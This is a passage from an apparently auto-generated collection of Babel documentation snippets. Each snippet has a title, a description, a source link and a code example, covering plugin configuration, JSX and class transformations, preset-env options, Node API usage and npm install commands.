</>\n));\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst descriptions = items.map((item) =>\n  React.createElement(\n    React.Fragment,\n    null,\n    React.createElement(\"dt\", null, item.name),\n    React.createElement(\"dd\", null, item.value)\n  )\n);\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/runtime\nDESCRIPTION: Installs the @babel/runtime package as a dependency using npm. This command adds the package to the project's node_modules directory and updates the package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save @babel/runtime\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node API\nDESCRIPTION: Shows how to use the @babel/plugin-transform-nullish-coalescing-operator via the Node API using `require(\"@babel/core\").transformSync`. The plugin is passed as an option to `transformSync`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-nullish-coalescing-operator\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with es2017 Preset\nDESCRIPTION: This snippet demonstrates how to configure Babel to use the es2017 preset.  This preset includes transforms for async/await and trailing commas in functions.  It configures Babel using the `.babelrc` configuration file.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-24-6.14.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// .babelrc\n{ \"presets\": [\"es2017\"] }\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-flow via Node API\nDESCRIPTION: Shows how to use the @babel/plugin-syntax-flow plugin programmatically via the Node API. The transformSync function is used to transform code with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-flow.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-flow\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Arrow Function Transformation Example (Out)\nDESCRIPTION: Shows the output JavaScript code after the arrow functions have been transformed into standard ES5 functions. This transformation ensures compatibility with older browsers or environments that don't natively support arrow functions. The `this` context is also handled appropriately.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a = function() {};\nvar a = function(b) {\n  return b;\n};\n\nconst double = [1, 2, 3].map(function(num) {\n  return num * 2;\n});\nconsole.log(double); // [2,4,6]\n\nvar bob = {\n  _name: \"Bob\",\n  _friends: [\"Sally\", \"Tom\"],\n  printFriends() {\n    var _this = this;\n\n    this._friends.forEach(function(f) {\n      return console.log(_this._name + \" knows \" + f);\n    });\n  },\n};\nconsole.log(bob.printFriends());\n```\n\n----------------------------------------\n\nTITLE: React Fragments Automatic Runtime (JSX to JS)\nDESCRIPTION: Demonstrates the transformation of React Fragments using the automatic runtime. Note the import of `Fragment`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst descriptions = items.map((item) => (\n  <>\n    <dt>{item.name}</dt>\n    <dd>{item.value}</dd>\n  </>\n));\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { jsxs as _jsxs } from \"react/jsx-runtime\";\nimport { Fragment as _Fragment } from \"react/jsx-runtime\";\nimport { jsx as _jsx } from \"react/jsx-runtime\";\n\nconst descriptions = items.map((item) =>\n  _jsxs(_Fragment, {\n    children: [\n      _jsx(\"dt\", {\n        children: item.name,\n      }),\n      _jsx(\"dd\", {\n        children: item.value,\n      }),\n    ],\n  })\n);\n```\n\n----------------------------------------\n\nTITLE: Promise transformation with @babel/runtime-corejs2\nDESCRIPTION: This shows how `@babel/runtime-corejs2` replaces global objects like `Promise` with their `core-js` equivalents when used with `@babel/plugin-transform-runtime`. This enables polyfilling for non-instance methods and ensures compatibility across different environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime-corejs2.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nPromise;\n```\n\n----------------------------------------\n\nTITLE: Transforming a File Synchronously\nDESCRIPTION: Illustrates how to use `babel.transformFileSync` to synchronously transform the contents of a file. The function takes the filename and options, returning an object with the transformed code, source map, and AST. Requires @babel/core and file system access.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFileSync(filename, options); // => { code, map, ast }\n```\n\n----------------------------------------\n\nTITLE: Class Method Decorator (JavaScript)\nDESCRIPTION: Illustrates a class method decorator that binds the method to the class instance.  The `bound` decorator modifies the method's initializer to bind `this` to the method when the class is instantiated. This prevents `this` context issues when the method is called.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  message = \"hello!\";\n\n  @bound\n  m() {\n    console.log(this.message);\n  }\n}\n\nfunction bound(value, { name, addInitializer }) {\n  addInitializer(function () {\n    this[name] = this[name].bind(this);\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: Class Definition (JavaScript)\nDESCRIPTION: This JavaScript code defines a class. The `noClassCalls` assumption tells Babel that classes are always instantiated with `new` and never called as functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Test {\n  constructor() {\n    this.x = 2;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration via assumptions\nDESCRIPTION: Shows the recommended approach to configure the transformation, using assumptions instead of the `loose` option. This offers granular control over specific deductions Babel applies.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"assumptions\": {\n    \"constantSuper\": true,\n    \"noClassCalls\": true,\n    \"setClassMethods\": true,\n    \"superIsCallableConstructor\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing core-js with npm\nDESCRIPTION: Demonstrates how to install core-js version 3 using npm. This is a prerequisite for using the 'useBuiltIns' option with Babel Preset Env to automatically inject polyfills.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install core-js@3 --save\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Example in JavaScript\nDESCRIPTION: This snippet showcases the use of the optional chaining operator (`?.`) in JavaScript. It enables safe property access and function calls on objects that might have nullish values. The example covers property access, function calls, and using `?.` with computed properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst city = person.address?.city; // person.address could be not defined\nconst isNeighbor = person.address?.isCloseTo(me);\n\nperson.sayHayUsing?.(\"Twitter\"); // The person.sayHayUsing method could be not defined\n```\n\n----------------------------------------\n\nTITLE: Enabling strictMode parser option in Babel\nDESCRIPTION: This snippet shows how to enable the `strictMode` parser option in Babel to replicate the `--alwaysStrict` TypeScript compiler option. It configures Babel's parser to enforce strict mode semantics.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  parserOpts: { strictMode: true },\n};\n```\n\n----------------------------------------\n\nTITLE: Configuration File (babel.config.json)\nDESCRIPTION: This JSON configuration shows how to enable the @babel/plugin-transform-parameters plugin in a babel.config.json file. This is the recommended way to configure Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-parameters\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/preset-env for core-js 3 in JavaScript\nDESCRIPTION: This configuration snippet shows how to enable core-js 3 support in @babel/preset-env.  The `useBuiltIns` option must be set to `usage` or `entry` and `corejs` option must be set to `3`. This configuration snippet requires @babel/preset-env and core-js@3 as dependencies.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\npresets: [\n  [\"@babel/preset-env\", {\n    useBuiltIns: \"usage\", // or \"entry\"\n    corejs: 3,\n  }]\n]\n```\n\n----------------------------------------\n\nTITLE: Running Babel CLI to compile code\nDESCRIPTION: This command compiles JavaScript code from the `src` directory to the `lib` directory using the Babel CLI.  It uses the configuration specified in `babel.config.json` or `babel.config.js` to determine the transformations to apply.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n./node_modules/.bin/babel src --out-dir lib\n```\n\n----------------------------------------\n\nTITLE: Installing TypeScript Preset (Shell)\nDESCRIPTION: This shell command demonstrates how to install the @babel/preset-typescript preset using npm or yarn. Using the --save-dev flag installs the preset as a development dependency.  This allows Babel to strip TypeScript type annotations from code.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-typescript\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel preset-env\nDESCRIPTION: This JSON configuration specifies the `@babel/preset-env` preset and configures it to load transformation plugins for features not available in the specified target browsers (Edge 17, Firefox 60, Chrome 67, Safari 11.1).\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_10\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"targets\": {\n          \"edge\": \"17\",\n          \"firefox\": \"60\",\n          \"chrome\": \"67\",\n          \"safari\": \"11.1\"\n        }\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Classic Runtime Import (JSX to JS)\nDESCRIPTION: Illustrates customizing the classic runtime with a custom pragma (e.g., `Preact.h`) to use an alternative library like Preact instead of React.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @jsx Preact.h */\n\nimport Preact from \"preact\";\n\nconst profile = (\n  <div>\n    <img src=\"avatar.png\" className=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @jsx Preact.h */\n\nimport Preact from \"preact\";\n\nconst profile = Preact.h(\n  \"div\",\n  null,\n  Preact.h(\"img\", { src: \"avatar.png\", className: \"profile\" }),\n  Preact.h(\"h3\", null, [user.firstName, user.lastName].join(\" \"))\n);\n```\n\n----------------------------------------\n\nTITLE: F# Pipeline Operator Support in Babel\nDESCRIPTION: This snippet showcases support for the F# pipeline operator, which allows chaining function calls in a more readable way.  The `|> ` operator passes the result of the left-hand side expression to the right-hand side function. Babel needs to transform this operator to standard JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nnum |> add(2) |> double\n```\n\n----------------------------------------\n\nTITLE: Debugging Script with babel-node-debug (Shell)\nDESCRIPTION: This snippet demonstrates how to debug a JavaScript file using the `babel-node-debug` command. It requires `babel-node-debug` to be installed. The command takes the path to the JavaScript file as an argument.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_node_debug/usage.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nbabel-node-debug path/to/script.js\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with version option - JSON\nDESCRIPTION: Illustrates configuring the `@babel/plugin-transform-runtime` plugin with a specific `version` option in `babel.config.json`. This allows the plugin to utilize more advanced features from later versions of `@babel/runtime`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-transform-runtime\", {\n      \"version\": \"^7.24.0\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: importInterop node example\nDESCRIPTION: Example of `importInterop: \"node\"` option, which binds the default export to the value of `module.exports`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport foo from \"foo\";\nimport { bar } from \"bar\";\nfoo;\nbar;\n\n// Is compiled to ...\n\n\"use strict\";\n\nvar _foo = require(\"foo\");\nvar _bar = require(\"bar\");\n\n_foo;\n_bar.bar;\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage\nDESCRIPTION: Example of using the Babel Node API to transform code with the @babel/plugin-transform-modules-systemjs plugin. This illustrates programmatic usage of the plugin within a Node.js environment, showing how to transform code strings.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-modules-systemjs\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transpile JavaScript with Babel using Gulp\nDESCRIPTION: This snippet demonstrates a basic Gulp task that uses gulp-babel to transpile JavaScript code. It reads the source file 'src/app.js', applies Babel transformations using the '@babel/preset-env' preset, and outputs the transpiled code to the 'dist' directory. The task is named 'default' and executed when running Gulp.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/gulp/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar gulp = require(\"gulp\");\nvar babel = require(\"gulp-babel\");\n\ngulp.task(\"default\", function () {\n  return gulp.src(\"src/app.js\")\n    .pipe(babel({\n      presets: [\"@babel/preset-env\"]\n    }))\n    .pipe(gulp.dest(\"dist\"));\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Plugins with No Options\nDESCRIPTION: This snippet demonstrates how to specify plugins with no options in the babel.config.json file. It shows three equivalent ways to include a plugin without specifying any options: by name, wrapped in an array, or wrapped in an array with an empty object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"pluginA\", [\"pluginA\"], [\"pluginA\", {}]]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with latest Preset\nDESCRIPTION: This snippet demonstrates how to configure Babel to use the latest preset. The latest preset includes transforms for ES2015, ES2016, and ES2017.  It also shows how to pass options down to the es2015 preset, in this case disabling module transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-24-6.14.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// .babelrc\n{ \"presets\": [\"latest\"] }\n// with options\n{ \"presets\": [\n  [\"latest\", {\n    \"es2015\": {\n      \"modules\": false\n    }\n  }]\n] }\n```\n\n----------------------------------------\n\nTITLE: Transform dynamic import to CommonJS\nDESCRIPTION: This code shows the transformation of a dynamic import to a CommonJS module format.  The `import()` call is replaced with a `require()` call wrapped in a `Promise` to maintain asynchronous behavior. It requires the `@babel/plugin-transform-modules-commonjs` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nPromise.resolve()\n  .then(() => _interopRequireWildcard(require(\"jquery\")))\n  .then(($) => {});\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage\nDESCRIPTION: This JavaScript code demonstrates how to use the Babel Node API to transform a string of code using the `@babel/plugin-transform-private-methods` plugin.  It requires the `@babel/core` package. The `transformSync` method returns the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-private-methods\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Preset Env Bugfixes Configuration JavaScript\nDESCRIPTION: This snippet shows how to configure `@babel/preset-env` with the `bugfixes` option enabled. Enabling this option can reduce the code output size by applying bugfixes specific to the target environment. This option will be enabled by default in Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-env\", {\n      \"targets\": { \"esmodules\": true }, // Use the targets that you was already using\n      \"bugfixes\": true // will be default in Babel 8\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Bundling with Babelify via CLI (Shell)\nDESCRIPTION: This command uses Browserify to bundle `script.js` using Babelify and outputs the result to `bundle.js`. It transforms the script using babelify.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/usage.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nbrowserify script.js -t babelify --outfile bundle.js\n```\n\n----------------------------------------\n\nTITLE: Async Function Transformation Output JavaScript\nDESCRIPTION: This example shows the output JavaScript code after the async function has been transformed into a generator function using the @babel/plugin-transform-async-to-generator plugin. It utilizes an _asyncToGenerator helper function to handle the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _asyncToGenerator = function (fn) {\n  ...\n};\nvar foo = _asyncToGenerator(function* () {\n  yield bar();\n});\n```\n\n----------------------------------------\n\nTITLE: Node API Usage\nDESCRIPTION: This example demonstrates how to use the @babel/plugin-transform-spread plugin via the Node API. It transforms the input code using the `transformSync` method.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-spread\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Using Plugin via Node API\nDESCRIPTION: Example of using the Babel Node API to transform code with the optional chaining plugin. This demonstrates how to programmatically transform code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-optional-chaining\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Add Named Import JavaScript\nDESCRIPTION: Adds a named import statement to the current module. Requires @babel/helper-module-imports. The 'path' argument is the current path, 'named' is the name to import, and 'source' is the module. If hintedName isn't set, the function generates a uuid as hintedName itself such as '_named'.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addNamed } from \"@babel/helper-module-imports\";\n// if the hintedName isn't set, the function will gennerate a uuid as hintedName itself such as '_named'\naddNamed(path, 'named', 'source');\n```\n\n----------------------------------------\n\nTITLE: Generating Code and Sourcemaps from Multiple Sources\nDESCRIPTION: This JavaScript code snippet demonstrates how to generate code and sourcemaps from an AST that is built from multiple sources. It uses `@babel/parser` to parse two strings as separate files, combines their ASTs, and then uses `@babel/generator` to generate the final code and sourcemap. The `generate` function receives an object mapping filenames to source code, which is essential for creating accurate sourcemaps that reference the original files. Dependencies: `@babel/parser`, `@babel/generator`\nSOURCE: https://github.com/babel/website/blob/main/docs/generator.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { parse } from \"@babel/parser\";\nimport { generate } from \"@babel/generator\";\n\nconst a = \"var a = 1;\";\nconst b = \"var b = 2;\";\nconst astA = parse(a, { sourceFilename: \"a.js\" });\nconst astB = parse(b, { sourceFilename: \"b.js\" });\nconst ast = {\n  type: \"Program\",\n  body: [].concat(astA.program.body, astB.program.body),\n};\n\nconst { code, map } = generate(\n  ast,\n  { sourceMaps: true },\n  {\n    \"a.js\": a,\n    \"b.js\": b,\n  }\n);\n\n// Sourcemap will point to both a.js and b.js where appropriate.\n```\n\n----------------------------------------\n\nTITLE: Configuring transform-remove-debugger (babel.config.json)\nDESCRIPTION: Configures the 'transform-remove-debugger' plugin within a 'babel.config.json' file. This is the recommended method for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-debugger.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-remove-debugger\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed Regex Literal (JavaScript)\nDESCRIPTION: This is the output from the Babel plugin, which wraps the regular expression with `_wrapRegExp`. The wrapper allows access to the named capture groups. It takes the original regular expression and an object mapping group names to their capture indices.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar re = _wrapRegExp(/(\\d{4})-(\\d{2})|(\\d{2})-(\\d{4})/, {\\n  year: [1, 4],\\n  month: [2, 3],\\n});\\n\nconsole.log(re.exec(\"02-1999\").groups.year);\n```\n\n----------------------------------------\n\nTITLE: Configuration File Usage (Without Options)\nDESCRIPTION: Demonstrates how to enable the plugin in a Babel configuration file without specifying any options.  The plugin is simply added to the 'plugins' array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-classes\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Babel presets with data-presets attribute\nDESCRIPTION: This shows how to enable Babel presets using the data-presets attribute. Multiple presets can be specified as a comma-separated list.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" data-presets=\"env,react\">\n\n```\n\n----------------------------------------\n\nTITLE: JSXElement SelfClosing Argument Removal Diff\nDESCRIPTION: This diff highlights the removal of the `selfClosing` argument from `t.jsxElement` in Babel 8, indicating it can be safely removed.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_64\n\nLANGUAGE: diff\nCODE:\n```\n- t.jsxElement(openingElement, closingElement, children, selfClosing?: boolean)\n+ t.jsxElement(openingElement, closingElement, children)\n```\n\n----------------------------------------\n\nTITLE: Transform Class Static Block JavaScript\nDESCRIPTION: Demonstrates the transformation of a class with a static block into a static private property within an IIFE. The original class `C` has a static block that handles potential errors during the initialization of the static property `y`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  static #x = 42;\n  static y;\n  static {\n    try {\n      this.y = doSomethingWith(this.#x);\n    } catch {\n      this.y = \"unknown\";\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: importInterop babel example\nDESCRIPTION: Example of `importInterop: \"babel\"` option, which uses the `__esModule` property to determine if an import is the default export.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport foo from \"foo\";\nimport { bar } from \"bar\";\nfoo;\nbar;\n\n// Is compiled to ...\n\n\"use strict\";\n\nfunction _interopRequireDefault(obj) {\n  return obj && obj.__esModule ? obj : { default: obj };\n}\n\nvar _foo = _interopRequireDefault(require(\"foo\"));\nvar _bar = require(\"bar\");\n\n_foo.default;\n_bar.bar;\n```\n\n----------------------------------------\n\nTITLE: Configuring the loose option in babel.config.json\nDESCRIPTION: Demonstrates how to configure the `loose` option in a `babel.config.json` file. When set to true, the plugin performs loose equality checks with `null` instead of strict checks against both `null` and `undefined`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"noDocumentAll\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration JSON\nDESCRIPTION: This JSON configuration file demonstrates how to configure the Babel plugin within a babel.config.json file.  It activates the plugin for the Babel transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-modules-umd\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Mocha Configuration to Use @babel/register\nDESCRIPTION: This snippet demonstrates how to update a Mocha configuration to use `@babel/register` instead of the deprecated `babel-core/register`. It involves changing the `--require` flag to point to the new package.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_34\n\nLANGUAGE: diff\nCODE:\n```\n- mocha --require babel-core/register\n+ mocha --require @babel/register\n```\n\n----------------------------------------\n\nTITLE: Installing babel-preset-env using npm\nDESCRIPTION: This command installs the babel-preset-env package as a development dependency using npm. It's a prerequisite for using the preset in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/env.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-preset-env --save-dev\n```\n\n----------------------------------------\n\nTITLE: Using Classic Runtime with Automatic (JSX to JS)\nDESCRIPTION: Demonstrates how to force classic runtime with automatic runtime by using the `@jsxRuntime classic` pragma.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @jsxRuntime classic */\n\nconst profile = (\n  <div>\n    <img src=\"avatar.png\" className=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst profile = React.createElement(\n  \"div\",\n  null,\n  React.createElement(\"img\", { src: \"avatar.png\", className: \"profile\" }),\n  React.createElement(\"h3\", null, [user.firstName, user.lastName].join(\" \"))\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring plugin with options in babel config\nDESCRIPTION: Configures the babel-plugin-transform-remove-console plugin with options to exclude specific console methods from removal.  Here, the 'error' and 'warn' methods are excluded from removal, ensuring that calls to `console.error` and `console.warn` remain in the output code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-console.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [[\"transform-remove-console\", { \"exclude\": [\"error\", \"warn\"] }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed Sticky Regex Example\nDESCRIPTION: This snippet shows the output of the transformation process. It demonstrates how the sticky regex literal is converted to a RegExp constructor call with the 'y' flag. This ensures compatibility with environments that do not natively support sticky regex literals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-sticky-regex.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a = new RegExp(\"o+\", \"y\");\n```\n\n----------------------------------------\n\nTITLE: Using the Babel Node API with the plugin\nDESCRIPTION: This JavaScript code snippet shows how to use the Babel Node API (`@babel/core`) to transform code with the `@babel/plugin-transform-property-literals` plugin. It takes a string of code as input and returns the transformed code. Requires @babel/core.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-literals.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-property-literals\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Babel preset-env with useBuiltIns option\nDESCRIPTION: This JSON configuration for Babel's preset-env sets the 'useBuiltIns' option to 'usage'. This setting optimizes polyfilling by only including the necessary polyfills based on the target environments and the code being used. The 'targets' option specifies the browsers to support.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_13\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"targets\": {\n          \"edge\": \"17\",\n          \"firefox\": \"60\",\n          \"chrome\": \"67\",\n          \"safari\": \"11.1\"\n        },\n        \"useBuiltIns\": \"usage\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin (JSON)\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-transform-react-jsx-compat` plugin in a `babel.config.json` file.  This is the recommended approach.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-compat.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-jsx-compat\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Exporting a Constant (JavaScript)\nDESCRIPTION: This JavaScript code exports a constant. The `enumerableModuleMeta` assumption tells Babel that it is safe to define `__esModule` as enumerable when compiling ESM to CJS, assuming the code never iterates over the keys of `module.exports`.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport const number = 2;\n```\n\n----------------------------------------\n\nTITLE: Import Module with Attributes (JavaScript)\nDESCRIPTION: Demonstrates importing a module with attributes using the 'with' keyword, which is part of the import attributes proposal.  It specifies how to load the module by providing additional parameters. This feature is now standard and supported by Babel by default.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-10-25-7.26.0.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport \"./my-module\" with { some_param: \"hello\" };\n```\n\n----------------------------------------\n\nTITLE: Class with declare and optional fields\nDESCRIPTION: Shows class field transformations.  `declare` fields are removed, while others are kept with potential undefined initialization.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nclass A {\n  declare foo: string; // Removed\n  bar: string; // Initialized to undefined\n  prop?: string; // Initialized to 